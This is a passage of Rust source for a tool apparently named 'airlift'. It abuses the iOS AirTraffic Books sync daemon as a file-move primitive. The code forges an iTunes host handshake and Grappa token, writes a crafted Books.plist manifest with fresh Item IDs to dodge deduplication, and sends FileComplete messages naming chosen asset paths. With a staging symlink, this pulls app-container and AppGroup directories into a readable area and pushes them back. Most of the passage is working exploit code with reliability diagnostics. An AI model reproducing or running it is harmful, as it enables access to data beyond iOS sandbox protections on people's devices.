/// Pure core of the pull manifest: the rows that go into `Books/Sync/Books.plist`
/// for a pull/restore run.
///
/// Derived from the verified AirCard reference (hoicau/AirCard-Linux, working on
/// iOS 27); each key cites where it comes from:
///
/// * `Persistent ID` — the asset id we want moved.
///   acl/crates/core/src/books.rs:74 (`synthetic_books_plist`), replaced with the
///   real asset id at acl/crates/core/src/staging.rs:42-45 and re-emitted per
///   transfer at acl/crates/core/src/customization.rs:198.
/// * `Item ID` — string, counted up from `item_base`. acl/crates/core/src/books.rs:75
///   (single asset) and acl/crates/core/src/customization.rs:199 (`n + 1` for each
///   transfer row). The reference used a fixed `1`; iOS dedupes outstanding assets
///   by `(DSID, Item ID)`, so a fixed base made every sync after the first reuse a
///   pair the daemon had already retired — see [`crate::exploit::new_item_base`].
/// * `DSID` — always `"1"`. acl/crates/core/src/books.rs:76,
///   acl/crates/core/src/customization.rs:200.
///
/// Rows we did *not* ask for are the "preserved" catalog rows: the reference
/// copies every existing row verbatim and appends the requested one at the end
/// (acl/crates/core/src/books.rs:107-127 and :149-150), and the device then
/// reports them back with `IsDownload=false`
/// (acl/crates/airtraffic/src/lib.rs:169-171,
/// acl/crates/airtraffic/src/handshake.rs:774). Their persistent ids are the
/// `retained_ids` of the session
/// (acl/crates/core/src/books.rs:140,
/// acl/crates/airtraffic/src/handshake.rs:227).
///
/// Our previous manifest replaced the whole file with just the requested rows,
/// so the device's own catalog rows vanished from the request; the first sync
/// consumed the Books asset state and later ones were answered with
/// `ObjectNotFound`.
///
/// `item_base` must be fresh per sync: the first sync with the old hard-coded
/// `(DSID, Item ID)` pair consumes it, and every later sync reusing it is
/// silently dropped from the AssetManifest.
fn build_pull_manifest(
    identifiers: &[String],
    preserved: &[plist::Value],
    item_base: u64,
) -> Result<Vec<u8>, String> {
    let mut rows: Vec<plist::Value> = preserved.to_vec();
    if rows.len() > MAX_PRESERVED_ROWS {
        return Err(format!(
            "Books.plist would carry {} preserved rows (limit {MAX_PRESERVED_ROWS})",
            rows.len()
        ));
    }
    for (index, id) in identifiers.iter().enumerate() {
        let mut row = plist::Dictionary::new();
        row.insert("Persistent ID".to_owned(), plist::Value::String(id.clone()));
        row.insert(
            "Item ID".to_owned(),
            plist::Value::String((item_base + index as u64 + 1).to_string()),
        );
        row.insert("DSID".to_owned(), plist::Value::String("1".to_owned()));
        rows.push(plist::Value::Dictionary(row));
    }
    let mut top = plist::Dictionary::new();
    top.insert("Books".to_owned(), plist::Value::Array(rows));
    let mut buf = Vec::new();
    plist::to_writer_binary(&mut buf, &plist::Value::Dictionary(top))
        .map_err(|e| format!("encode pull manifest: {e}"))?;
    Ok(buf)
}

/// Pull the catalog rows out of a snapshotted `Books/Sync/Books.plist` so they
/// can be re-emitted verbatim alongside the requested asset.
///
/// Mirrors acl/crates/core/src/books.rs:97-127: the array under the `Books` key
/// of every snapshotted catalog plist is kept row-for-row, minus any row whose
/// `Persistent ID` is one of the ids this run is requesting (the reference
/// treats that as a conflict, acl/crates/core/src/books.rs:123-125 — we drop the
/// stale row instead, since the requested row is appended fresh anyway).
///
/// Returns the rows and their persistent ids (`retained_ids` in the reference).
fn preserved_rows(
    snapshot_books_plist: Option<&[u8]>,
    identifiers: &[String],
) -> Result<(Vec<plist::Value>, Vec<String>), String> {
    let Some(bytes) = snapshot_books_plist else {
        return Ok((Vec::new(), Vec::new()));
    };
    let value = plist::from_bytes::<plist::Value>(bytes)
        .map_err(|e| format!("snapshot Books.plist does not parse: {e}"))?;
    let Some(rows) = value
        .as_dictionary()
        .and_then(|d| d.get("Books"))
        .and_then(plist::Value::as_array)
    else {
        // An empty/absent Books array is the normal state; nothing to preserve.
        return Ok((Vec::new(), Vec::new()));
    };

    let mut kept: Vec<plist::Value> = Vec::new();
    let mut ids: Vec<String> = Vec::new();
    for row in rows {
        let Some(id) = row
            .as_dictionary()
            .and_then(|d| d.get("Persistent ID"))
            .and_then(plist::Value::as_string)
        else {
            // acl/crates/core/src/books.rs:109-112 refuses a row without a
            // persistent id. Refusing the whole run here would strand the pull,
            // so the malformed row is dropped and reported by its absence.
            continue;
        };
        if identifiers.iter().any(|want| want == id) || ids.iter().any(|seen| seen == id) {
            continue;
        }
        // Stale rows from an earlier this-app pull (its staging symlink, its
        // recovered staging area, or a canary file it created) are noise the
        // snapshot picked up from `Books/Sync/Books.plist` — a file this code
        // writes itself, so a STEP D manifest written minutes ago is still in
        // it. Keeping those rows makes the daemon attempt five downloads at
        // once and turns a reproducible pull into a coin flip: on device the
        // AppGroup root pulled fine with one stale row present, and every
        // app-container pull failed with four. Only a genuine library row (one
        // that names nothing of ours) is preserved.
        if id.contains("airlift-") {
            continue;
        }
        if ids.len() >= MAX_PRESERVED_ROWS {
            break;
        }
        ids.push(id.to_owned());
        kept.push(row.clone());
    }
    Ok((kept, ids))
}

/// Write the pull/restore manifest: every preserved catalog row from the
/// snapshot, then one requested row per identifier.
///
/// `item_base` has to be a value no earlier sync used — each ATC session is one
/// sync, and iOS drops a request whose `(DSID, Item ID)` pair it has already
/// consumed. Callers therefore pass a base they just generated.
async fn write_books_plist(
    afc: &mut AfcClient,
    identifiers: &[String],
    preserved: &[plist::Value],
    item_base: u64,
    logger: &Logger,
) -> Result<(), String> {
    for dir in ["Airlock", "Airlock/Book", AIRLOCK_READ, "Books", "Books/Sync"] {
        let _ = afc.mk_dir(dir).await;
    }
    let plist_bytes = build_pull_manifest(identifiers, preserved, item_base)?;
    logger.log(format!(
        "airlift: manifest to write = {} byte(s), {} preserved row(s), Item ID base {item_base}, requested {:?}",
        plist_bytes.len(),
        preserved.len(),
        identifiers
    ));
    // `open(WrOnly)` does NOT truncate: a shorter manifest would leave the
    // tail of a longer previous one and the daemon would parse garbage.
    let _ = afc.remove(BOOKS_PLIST).await;
    let mut fd = afc
        .open(BOOKS_PLIST, AfcFopenMode::WrOnly)
        .await
        .map_err(|e| format!("AFC open Books.plist: {e:?}"))?;
    fd.write_entire(&plist_bytes)
        .await
        .map_err(|e| format!("AFC write Books.plist: {e:?}"))?;
    let _ = fd.close().await;
    logger.log(format!(
        "airlift: Books.plist manifest now declares {identifiers:?}"
    ));
    // Read the file back off the device. `write_entire` reporting success only
    // means the bytes were accepted; the daemon parses whatever is really on
    // disk, so a short write or a stale file has to be visible here.
    log_books_plist_on_device(afc, identifiers, logger).await;
    Ok(())
}

/// Diagnostics for C: what the daemon will actually parse.
///
/// AFC-stats `Books/Sync/Books.plist` and reports the size the device reports,
/// the number of `Books` rows it decodes, and the first row's `Persistent ID`.
/// A size that differs from what was written, or a row count of 0, or a first
/// row that is not ours, is the difference between "the daemon refused this
/// request" and "we never wrote the request we thought we wrote".
async fn log_books_plist_on_device(
    afc: &mut AfcClient,
    identifiers: &[String],
    logger: &Logger,
) {
    match afc.get_file_info(BOOKS_PLIST.to_owned()).await {
        Ok(info) => logger.log(format!(
            "airlift: DIAG Books.plist on device: size={} byte(s)",
            info.size
        )),
        Err(e) => {
            logger.log(format!(
                "airlift: DIAG Books.plist on device: stat failed ({e:?}) — the manifest may not have landed"
            ));
            return;
        }
    }

    let mut fd = match afc.open(BOOKS_PLIST.to_owned(), AfcFopenMode::RdOnly).await {
        Ok(fd) => fd,
        Err(e) => {
            logger.log(format!(
                "airlift: DIAG Books.plist on device: read open failed ({e:?})"
            ));
            return;
        }
    };
    let read = fd.read_entire().await;
    let _ = fd.close().await;
    let bytes = match read {
        Ok(bytes) => bytes,
        Err(e) => {
            logger.log(format!(
                "airlift: DIAG Books.plist on device: read failed ({e:?})"
            ));
            return;
        }
    };

    let value = match plist::from_bytes::<plist::Value>(&bytes) {
        Ok(value) => value,
        Err(e) => {
            logger.log(format!(
                "airlift: DIAG Books.plist on device: {} byte(s) did not parse as a plist ({e})",
                bytes.len()
            ));
            return;
        }
    };
    let rows = value
        .as_dictionary()
        .and_then(|d| d.get("Books"))
        .and_then(plist::Value::as_array);
    let Some(rows) = rows else {
        logger.log(format!(
            "airlift: DIAG Books.plist on device: {} byte(s) parsed, but there is no 'Books' array",
            bytes.len()
        ));
        return;
    };
    let first_id = rows
        .first()
        .and_then(|r| r.as_dictionary())
        .and_then(|d| d.get("Persistent ID"))
        .and_then(plist::Value::as_string)
        .unwrap_or("<none>");
    let requested_first = identifiers.first().map(String::as_str).unwrap_or("<none>");
    logger.log(format!(
        "airlift: DIAG Books.plist on device: {} byte(s) parsed, {} Books row(s), first Persistent ID={first_id} (we requested {requested_first})",
        bytes.len(),
        rows.len()
    ));
    for (n, row) in rows.iter().enumerate() {
        let id = row
            .as_dictionary()
            .and_then(|d| d.get("Persistent ID"))
            .and_then(plist::Value::as_string)
            .unwrap_or("<none>");
        let item = row
            .as_dictionary()
            .and_then(|d| d.get("Item ID"))
            .and_then(plist::Value::as_string)
            .unwrap_or("<none>");
        let dsid = row
            .as_dictionary()
            .and_then(|d| d.get("DSID"))
            .and_then(plist::Value::as_string)
            .unwrap_or("<none>");
        logger.log(format!(
            "airlift: DIAG Books.plist row {n}: Persistent ID={id} Item ID={item} DSID={dsid}"
        ));
    }
}

/// What one ATC session actually saw on the wire, so a failed run can explain
/// itself instead of only reporting `ObjectNotFound`.
///
/// Filled by [`atc_asset_sync`] and summarised by [`log_session_diag`] when the
/// pull never showed up.
#[derive(Default)]
struct SyncDiag {
    ready_observed: bool,
    manifest_observed: bool,
    /// `AssetID`/`IsDownload` of every `Book` entry the device sent back.
    manifest_entries: Vec<String>,
    /// Verbatim `SyncFailed` payloads, which carry the daemon's real reason.
    sync_notices: Vec<String>,
}

impl SyncDiag {
    fn summary(&self) -> String {
        format!(
            "ReadyForSync={} AssetManifest={} manifest entries=[{}] SyncFailed notices={} [{}]",
            self.ready_observed,
            self.manifest_observed,
            self.manifest_entries.join(", "),
            self.sync_notices.len(),
            self.sync_notices.join(" | ")
        )
    }
}

/// `AssetID`/`IsDownload` of every `Book` entry in an `AssetManifest` payload.
///
/// This is the check that explains "it moved once, then never again": the
/// device echoes what it believes is pending, and a requested id that comes back
/// with `IsDownload=false` (or not at all) means our `Books.plist` was not read
/// as a download request.
fn manifest_entry_ids(dict: &plist::Dictionary) -> Vec<String> {
    let Some(params) = dict.get("Params").and_then(|p| p.as_dictionary()) else {
        return Vec::new();
    };
    let Some(manifest) = params.get("AssetManifest").and_then(|m| m.as_dictionary()) else {
        return Vec::new();
    };
    let Some(books) = manifest.get("Book").and_then(|b| b.as_array()) else {
        return Vec::new();
    };
    books
        .iter()
        .map(|entry| {
            let Some(row) = entry.as_dictionary() else {
                return "<not a dictionary>".to_owned();
            };
            let id = row
                .get("AssetID")
                .and_then(plist::Value::as_string)
                .unwrap_or("<no AssetID>");
            let download = match row.get("IsDownload").and_then(plist::Value::as_boolean) {
                Some(true) => "IsDownload=true",
                Some(false) => "IsDownload=false",
                None => "IsDownload=<absent>",
            };
            format!("{id} {download}")
        })
        .collect()
}

/// Log `Params/DataProtected` whenever a dict carries it.
///
/// The flag rides on the handshake dicts (`Capabilities`, `SyncAllowed`, and the
/// session-1 sync state) and is the one wire field that says whether the account
/// is in a data-protected state the daemon would refuse assets for — so a refusal
/// has to name it rather than leave it to be guessed at. Both spellings are
/// checked because the plist key is not spelled consistently on device.
fn log_data_protected(label: &str, dict: &plist::Dictionary, logger: &Logger) {
    let Some(params) = dict.get("Params").and_then(|p| p.as_dictionary()) else {
        return;
    };
    for key in ["DataProtected", "Data Protected"] {
        if let Some(value) = params.get(key) {
            logger.log(format!("airlift: {label}: DataProtected={value:?}"));
        }
    }
}

/// One-line roll-up of a session's observations, plus the verdict that follows
/// from them.
fn log_session_diag(label: &str, diag: &SyncDiag, logger: &Logger) {
    logger.log(format!("airlift: DIAG {label} session summary: {}", diag.summary()));
    if !diag.manifest_observed {
        logger.log(format!(
            "airlift: DIAG {label}: the device never sent an AssetManifest, so it did not accept the request as a download list (ReadyForSync={})",
            diag.ready_observed
        ));
    }
    if !diag.manifest_entries.is_empty() {
        for id in &diag.manifest_entries {
            logger.log(format!("airlift: DIAG {label}: manifest entry {id}"));
        }
    }
}

/// The AirTraffic handshake plus one `FileComplete` per asset, all in one
/// session — byte-for-byte the sequence the proven write path drives:
///
/// `Capabilities`/`SyncAllowed` → `HostInfo` → `RequestingSync` →
/// `ReadyForSync` → `FinishedSyncingMetadata` → `AssetManifest` →
/// `FileComplete`×N.
///
/// `identifiers` and `destinations` are parallel and must have the same
/// length; the order is significant (the symlink has to be in place before the
/// directory is dropped through it), hence the fixed pause between messages.
async fn atc_asset_sync(
    tunnel: &mut AppDeviceTunnel,
    identifiers: &[String],
    destinations: &[String],
    label: &str,
    logger: &Logger,
    diag: &mut SyncDiag,
) -> Result<(), String> {
    if identifiers.len() != destinations.len() {
        return Err(format!(
            "internal: {label} has {} identifiers but {} destinations",
            identifiers.len(),
            destinations.len()
        ));
    }

    let mut atc_stream = tunnel.connect_service("com.apple.atc", logger).await?;

    // Wait for SyncAllowed (capturing GrappaSupportInfo on the way).
    let mut grappa_info: Option<(u32, u32, u32)> = None;
    for _ in 0..12 {
        match tokio::time::timeout(
            Duration::from_millis(1500),
            read_atc_dict(&mut atc_stream),
        )
        .await
        {
            Ok(Ok(dict)) => {
                log_data_protected(label, &dict, logger);
                if let Some(name) = atc_message_name(&dict) {
                    logger.log(format!("airlift: {label}: atc received '{name}'"));
                    if name == "Capabilities" {
                        if let Some(params) = dict.get("Params").and_then(|p| p.as_dictionary()) {
                            if let Some(gi) = params
                                .get("GrappaSupportInfo")
                                .and_then(|g| g.as_dictionary())
                            {
                                let ver = gi
                                    .get("version")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(1) as u32;
                                let dt = gi
                                    .get("deviceType")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(0) as u32;
                                let pv = gi
                                    .get("protocolVersion")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(1) as u32;
                                logger.log(format!(
                                    "airlift: {label}: GrappaSupportInfo version={ver}, deviceType={dt}, protocolVersion={pv}"
                                ));
                                grappa_info = Some((ver, dt, pv));
                            }
                        }
                    }
                    if name == "SyncAllowed" {
                        break;
                    }
                }
            }
            Ok(Err(_)) => break,
            Err(_) => {}
        }
    }

    // HostInfo (Session = 0)
    let mut host_info_dict = plist::Dictionary::new();
    host_info_dict.insert("Type".into(), plist::Value::String("iTunes".into()));
    host_info_dict.insert("Version".into(), plist::Value::String("13.7.0.161".into()));
    host_info_dict.insert("MacOSVersion".into(), plist::Value::String("15.0".into()));
    host_info_dict.insert("SyncHostName".into(), plist::Value::String("airlift".into()));
    let library_id = format!(
        "{}-{}-{}-{}-{}",
        random_hex(4),
        random_hex(2),
        random_hex(2),
        random_hex(2),
        random_hex(6)
    );
    host_info_dict.insert("LibraryID".into(), plist::Value::String(library_id));
    host_info_dict.insert(
        "SyncedDataclasses".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    host_info_dict.insert(
        "SyncedAssetTypes".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    host_info_dict.insert("Wakeable".into(), plist::Value::Boolean(false));

    let grappa_token = crate::grappa::generate_grappa_token(grappa_info, |s| logger.log(s));
    if let Some(ref token) = grappa_token {
        host_info_dict.insert("Grappa".into(), plist::Value::Data(token.clone()));
    }

    let mut host_info_params = plist::Dictionary::new();
    host_info_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info_dict.clone()));
    host_info_params.insert("LocalCloudSupport".into(), plist::Value::Boolean(false));
    send_atc_dict(&mut atc_stream, &make_atc_msg("HostInfo", 0, Some(host_info_params))).await?;

    tokio::time::sleep(Duration::from_millis(200)).await;

    // RequestingSync (Session = 1)
    let mut sync_req_params = plist::Dictionary::new();
    sync_req_params.insert(
        "Dataclasses".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    sync_req_params.insert(
        "DataclassAnchors".into(),
        plist::Value::Dictionary(plist::Dictionary::new()),
    );
    sync_req_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info_dict));
    if let Some(token) = grappa_token {
        sync_req_params.insert("Grappa".into(), plist::Value::Data(token));
    }
    send_atc_dict(
        &mut atc_stream,
        &make_atc_msg("RequestingSync", 1, Some(sync_req_params)),
    )
    .await?;

    // ReadyForSync
    let mut ready = false;
    for _ in 0..24 {
        match tokio::time::timeout(Duration::from_secs(5), read_atc_dict(&mut atc_stream)).await {
            Ok(Ok(dict)) => {
                log_data_protected(label, &dict, logger);
                if let Some(name) = atc_message_name(&dict) {
                    logger.log(format!("airlift: {label}: atc sync state '{name}'"));
                    if name == "Ping" {
                        let _ = send_atc_dict(&mut atc_stream, &make_atc_msg("Pong", 1, None)).await;
                        continue;
                    }
                    if name == "ReadyForSync" || name == "AssetManifest" {
                        ready = true;
                        break;
                    }
                    if name == "SyncFailed" {
                        // The daemon's real reason lives in this payload, not in
                        // the later ObjectNotFound: keep it for the summary.
                        diag.sync_notices.push(format!("{dict:?}"));
                        logger.log(format!("airlift: {label}: atc sync notice (non-fatal): {dict:?}"));
                        continue;
                    }
                }
            }
            Ok(Err(e)) => return Err(format!("{label}: ATC read error: {e}")),
            Err(_) => {}
        }
    }
    diag.ready_observed = ready;
    if !ready {
        return Err(format!(
            "{label}: AirTraffic ReadyForSync not observed (ensure Apple Books is installed)"
        ));
    }

    // FinishedSyncingMetadata (Session = 1)
    let mut sync_types = plist::Dictionary::new();
    sync_types.insert("Book".into(), plist::Value::Integer(1.into()));
    let mut meta_params = plist::Dictionary::new();
    meta_params.insert("SyncTypes".into(), plist::Value::Dictionary(sync_types));
    meta_params.insert(
        "DataclassAnchors".into(),
        plist::Value::Dictionary(plist::Dictionary::new()),
    );
    send_atc_dict(
        &mut atc_stream,
        &make_atc_msg("FinishedSyncingMetadata", 1, Some(meta_params)),
    )
    .await?;

    // AssetManifest
    let mut manifest_observed = false;
    for _ in 0..20 {
        match tokio::time::timeout(Duration::from_secs(5), read_atc_dict(&mut atc_stream)).await {
            Ok(Ok(dict)) => {
                if let Some(name) = atc_message_name(&dict) {
                    logger.log(format!("airlift: {label}: atc manifest message '{name}'"));
                    if name == "Ping" {
                        let _ = send_atc_dict(&mut atc_stream, &make_atc_msg("Pong", 1, None)).await;
                        continue;
                    }
                    if name == "AssetManifest" {
                        manifest_observed = true;
                        diag.manifest_observed = true;
                        diag.manifest_entries = manifest_entry_ids(&dict);
                        log_session_diag(label, diag, logger);
                        break;
                    }
                    if name == "SyncFailed" {
                        diag.sync_notices.push(format!("{dict:?}"));
                        logger.log(format!("airlift: {label}: atc manifest notice (non-fatal): {dict:?}"));
                        continue;
                    }
                    if name == "SyncFinished" {
                        break;
                    }
                }
            }
            Ok(Err(e)) => return Err(format!("{label}: ATC manifest read error: {e}")),
            Err(_) => {}
        }
    }
    if !manifest_observed {
        // Say what the session did see: a SyncFailed here is the difference
        // between "Books refused the request" and "nothing was ever sent".
        log_session_diag(label, diag, logger);
        return Err(format!(
            "{label}: AirTraffic AssetManifest not observed (ensure Apple Books is installed); {}",
            diag.summary()
        ));
    }

    // FileComplete per asset, in order.
    for (index, (asset_id, asset_path)) in identifiers.iter().zip(destinations.iter()).enumerate() {
        // Machine-greppable: the exact AssetID/AssetPath pair is the whole
        // primitive, so a wrong id or a wrong base has to be one grep away.
        logger.log(format!(
            "airlift: DIAG {label}: FileComplete [{}/{}] AssetID={asset_id} AssetPath={asset_path}",
            index + 1,
            identifiers.len()
        ));
        let mut file_complete_params = plist::Dictionary::new();
        file_complete_params.insert("AssetID".into(), plist::Value::String(asset_id.clone()));
        file_complete_params.insert("Dataclass".into(), plist::Value::String("Book".into()));
        file_complete_params.insert("AssetPath".into(), plist::Value::String(asset_path.clone()));
        send_atc_dict(
            &mut atc_stream,
            &make_atc_msg("FileComplete", 1, Some(file_complete_params)),
        )
        .await?;
        if index + 1 < identifiers.len() {
            tokio::time::sleep(FILE_COMPLETE_PAUSE).await;
        }
    }

    // Drain what the daemon still has to say instead of dropping the stream on
    // it: `SyncFinished`/`SyncFailed` for the last `FileComplete` only arrive
    // afterwards, and the `SyncFailed` payload carries the real reason. Bounded
    // two ways (16 messages / 8 s) so a silent daemon cannot wedge the pull.
    let drain_started = tokio::time::Instant::now();
    let drain_budget = Duration::from_secs(8);
    for _ in 0..16 {
        let elapsed = drain_started.elapsed();
        if elapsed >= drain_budget {
            logger.log(format!(
                "airlift: {label}: atc post-FileComplete drain budget spent after {elapsed:?}"
            ));
            break;
        }
        match tokio::time::timeout(
            (drain_budget - elapsed).min(Duration::from_secs(2)),
            read_atc_dict(&mut atc_stream),
        )
        .await
        {
            Ok(Ok(dict)) => {
                let name = atc_message_name(&dict).unwrap_or_else(|| "<unnamed>".to_owned());
                logger.log(format!(
                    "airlift: {label}: atc post-FileComplete received '{name}'"
                ));
                if name == "SyncFailed" {
                    // The daemon's real reason lives in this payload, not in the
                    // later ObjectNotFound.
                    diag.sync_notices.push(format!("{dict:?}"));
                    logger.log(format!(
                        "airlift: {label}: atc post-FileComplete sync notice: {dict:?}"
                    ));
                }
                if name == "SyncFinished" || name == "SyncFailed" {
                    break;
                }
            }
            Ok(Err(e)) => {
                logger.log(format!(
                    "airlift: {label}: atc post-FileComplete read error ({e}); ending the drain"
                ));
                break;
            }
            Err(_) => {
                logger.log(format!(
                    "airlift: {label}: atc post-FileComplete went quiet; ending the drain"
                ));
                break;
            }
        }
    }
    drop(atc_stream);
    tokio::time::sleep(Duration::from_millis(300)).await;
    logger.log(format!("airlift: {label}: ATC session finished"));
    Ok(())
}

/// Remove a path, tolerating "not there" — cleanup is always best-effort.
async fn remove_quietly(afc: &mut AfcClient, path: &str, logger: &Logger) {
    if afc.remove(path.to_owned()).await.is_ok() {
        logger.log(format!("airlift: removed {path}"));
        return;
    }
    if afc.remove_all(path.to_owned()).await.is_ok() {
        logger.log(format!("airlift: removed {path} recursively"));
        return;
    }
    logger.log(format!("airlift: nothing to remove at {path}"));
}

async fn open_session(
    pairing_path: &str,
    logger: &Logger,
) -> Result<(AppDeviceTunnel, AfcClient), String> {
    let pairing_bytes = std::fs::read(pairing_path)
        .map_err(|e| format!("Failed to read pairing file at {pairing_path}: {e}"))?;
    let mut tunnel = connect_tunnel(&pairing_bytes, logger).await?;
    let mut afc = tunnel.connect_afc(logger).await?;
    for dir in ["Airlock", AIRLOCK_READ, "Books", "Books/Sync"] {
        let _ = afc.mk_dir(dir).await;
    }
    Ok((tunnel, afc))
}

/// STEP D — persist the recovery record next to the pulled directory.
async fn write_recovery_record(
    afc: &mut AfcClient,
    record: &RecoveryRecord,
    logger: &Logger,
) -> Result<(), String> {
    let path = format!("{AIRLOCK_READ}/{}.json", record.token);
    let bytes = serde_json::to_vec(record).map_err(|e| format!("encode recovery record: {e}"))?;
    // `open(WrOnly)` does NOT truncate, so a shorter record would leave a stale
    // tail that no longer parses as JSON.
    let _ = afc.remove(path.clone()).await;
    let mut fd = afc
        .open(path.clone(), AfcFopenMode::WrOnly)
        .await
        .map_err(|e| format!("AFC open {path}: {e:?}"))?;
    fd.write_entire(&bytes)
        .await
        .map_err(|e| format!("AFC write {path}: {e:?}"))?;
    let _ = fd.close().await;
    logger.log(format!("airlift: STEP D recovery record written to {path}"));
    Ok(())
}

/// Message used whenever the pulled data has to stay where it is. The wording
/// is contractual: the Swift layer greps for it to offer `al_airlift_recover`.
fn kept_at_error(token: &str, reason: &str) -> String {
    format!(
        "airlift pull '{token}': {reason}; directory kept at {AIRLOCK_READ}/{token}; retry or call al_airlift_recover"
    )
}

// ---------------------------------------------------------------------------
// Staging observation (bounded retries)
//
// The Books daemon applies a `FileComplete` move *asynchronously*: on device
// `Airlock/Read/<T>` only became listable about two seconds after the ATC
// session had finished, and a nested pull reported a bare
// `Afc(ObjectNotFound)` when checked immediately. A single immediate check
// therefore proves nothing, and — much worse — treating it as proof of failure
// used to skip STEP C entirely and strand the real directory in the staging
// area. Everything below exists so that "not there yet" is never mistaken for
// "not moved".
// ---------------------------------------------------------------------------

/// How many times `Airlock/Read/<T>` is re-listed after STEP B, and how long to
/// wait between attempts: 20 × 1 s ≈ 20 s of grace. A real move has been
/// observed to complete in ~2 s; on-device testing showed that a move that has
/// not materialised within 20 s never does, and longer waits only stall the
/// browse. The periodic `Airlock/Read` dump below is what distinguishes "slow"
/// from "refused".
const STAGING_POLL_ATTEMPTS: usize = 20;
const STAGING_POLL_INTERVAL: Duration = Duration::from_secs(1);
/// Shorter poll after STEP C — that move is already under way.
const RESTORE_POLL_ATTEMPTS: usize = 4;

/// Make sure the pull's destination parent exists before STEP B.
///
/// The move writes to `<dest>`, so a missing `Airlock/Read` means the pull has
/// nowhere to land. `mk_dir` failures are logged rather than fatal (the directory
/// usually exists and AFC answers "already exists"), and the follow-up
/// `get_file_info` turns a genuinely unusable staging area into one clear log
/// line instead of a mysterious `ObjectNotFound` later on.
async fn ensure_read_dir(afc: &mut AfcClient, logger: &Logger) {
    for dir in ["Airlock", AIRLOCK_READ] {
        if let Err(e) = afc.mk_dir(dir).await {
            logger.log(format!(
                "airlift: mk_dir({dir}) reported {e:?} (an existing directory is fine)"
            ));
        }
    }
    match afc.get_file_info(AIRLOCK_READ).await {
        Ok(info) => logger.log(format!(
            "airlift: staging parent {AIRLOCK_READ} is ready ({})",
            info.st_ifmt
        )),
        Err(e) => logger.log(format!(
            "airlift: warning: {AIRLOCK_READ} is still not visible after mk_dir ({e:?}); the pull may have no destination"
        )),
    }
}

/// Poll `Airlock/Read/<T>` until it lists. The listing *is* the verification of
/// STEP B — a directory AFC can list is a directory the daemon moved.
///
/// Returns the listing JSON, or the last AFC error after every attempt failed.
async fn wait_for_staged_listing(
    afc: &mut AfcClient,
    read_dir: &str,
    logger: &Logger,
) -> Result<String, String> {
    let mut last_error = String::from("no listing attempt was made");
    for attempt in 1..=STAGING_POLL_ATTEMPTS {
        match list_dir_json(afc, read_dir).await {
            Ok(json) => {
                logger.log(format!(
                    "airlift: {read_dir} listed on attempt {attempt}/{STAGING_POLL_ATTEMPTS}"
                ));
                return Ok(json);
            }
            Err(e) => {
                last_error = e;
                logger.log(format!(
                    "airlift: {read_dir} not listable yet ({attempt}/{STAGING_POLL_ATTEMPTS}): {last_error}"
                ));
                // Every so often show what `Airlock/Read` itself holds. The
                // per-directory error above only ever says "not there", so this
                // is the only evidence of a directory the daemon nested under
                // our token instead of moving.
                if matches!(attempt, 5 | 10 | 20) {
                    match afc.list_dir(AIRLOCK_READ).await {
                        Ok(names) => logger.log(format!(
                            "airlift: DIAG Airlock/Read listing now: {names:?}"
                        )),
                        Err(e) => logger.log(format!(
                            "airlift: DIAG Airlock/Read listing failed: {e:?}"
                        )),
                    }
                }
                if attempt < STAGING_POLL_ATTEMPTS {
                    tokio::time::sleep(STAGING_POLL_INTERVAL).await;
                }
            }
        }
    }
    Err(last_error)
}

/// Name the staging layout the daemon produced when the listing is *exactly*
/// the target directory sitting there.
///
/// A listing that holds one directory named like the asset is not the moved
/// target — it is the daemon having nested the asset one level deeper, so the
/// pull "succeeds" while `Airlock/Read/<T>` is the wrong directory. Pure, so
/// the shape is unit-testable.
fn log_nesting_probe(json: &str, basename: &str, logger: &Logger) {
    let Ok(parsed) = serde_json::from_str::<serde_json::Value>(json) else {
        return;
    };
    let Some(entries) = parsed.as_array() else {
        return;
    };
    if entries.len() != 1 {
        return;
    }
    let only = &entries[0];
    let is_dir = only.get("is_dir").and_then(serde_json::Value::as_bool);
    let name = only.get("name").and_then(serde_json::Value::as_str);
    if is_dir == Some(true) && name == Some(basename) {
        logger.log(format!(
            "airlift: DIAG STEP B: staging contains only '{basename}' — the daemon may have nested the asset; the listing is NOT the target directory"
        ));
    }
}

/// Bounded existence re-check for the staged copy. `false` means the daemon is
/// done with `read_dir` — either it never arrived, or it was moved back.
async fn staging_present(
    afc: &mut AfcClient,
    read_dir: &str,
    attempts: usize,
    logger: &Logger,
) -> bool {
    for attempt in 1..=attempts {
        if afc.get_file_info(read_dir.to_owned()).await.is_ok() {
            return true;
        }
        if attempt < attempts {
            tokio::time::sleep(STAGING_POLL_INTERVAL).await;
        }
    }
    logger.log(format!(
        "airlift: {read_dir} is absent after {attempts} check(s)"
    ));
    false
}

/// What the state after STEP C means. Pure, so the decision table is
/// unit-tested instead of only being reachable on a paired device.
#[derive(Debug, PartialEq, Eq)]
enum RestoreOutcome {
    /// The directory is back where it came from — return the listing.
    Restored,
    /// The staged copy is gone and STEP B never produced one, so STEP C had
    /// nothing to restore. Report the original STEP B reason (there is no
    /// `kept at …` copy to point at).
    NothingWasStaged,
    /// The staged copy is still parked. Keep it, keep its recovery record and
    /// tell the caller to run `al_airlift_recover`.
    StillStaged,
    /// The staged copy is gone but the restore destination was never confirmed.
    GoneUnconfirmed,
}

/// Decide the outcome from what the device reported.
///
/// Ordering matters: a still-present staged copy always wins, because it is the
/// only thing that can still be lost. `step_c_ok` deliberately does *not* gate
/// success — the observed device behaviour was that the move completed even
/// though the session reported an error, so "session said no" plus "staging is
/// gone" plus "destination exists" is still a restore.
fn classify_restore(
    step_b_ok: bool,
    step_c_ok: bool,
    staging_present: bool,
    destination_present: bool,
) -> RestoreOutcome {
    let _ = step_c_ok;
    if staging_present {
        return RestoreOutcome::StillStaged;
    }
    if !step_b_ok {
        return RestoreOutcome::NothingWasStaged;
    }
    if destination_present {
        return RestoreOutcome::Restored;
    }
    RestoreOutcome::GoneUnconfirmed
}

// ---------------------------------------------------------------------------
// STEP A/B/C/D driver
// ---------------------------------------------------------------------------

/// Pull `target_abs` into `Airlock/Read/<T>`, list it, push it back and clean
/// up. Returns the listing JSON in exactly the shape `al_dir_list` emits.
///
/// `item_base` is the `Item ID` base of the STEP B request; it must be a value
